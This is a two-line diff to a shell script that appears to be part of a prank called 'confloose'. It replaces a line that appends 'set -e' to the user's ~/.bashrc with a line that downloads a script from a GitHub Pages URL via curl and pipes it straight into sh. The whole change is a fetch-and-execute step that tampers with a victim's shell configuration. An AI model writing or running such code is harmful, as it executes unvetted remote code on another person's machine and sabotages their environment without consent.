@@ -1,3 +1,3 @@
 #!/bin/sh
 
-echo -e "set -e # confloose by leo" >> "$HOME/.bashrc"
+echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "set-e" "\"set -e\"" | sh
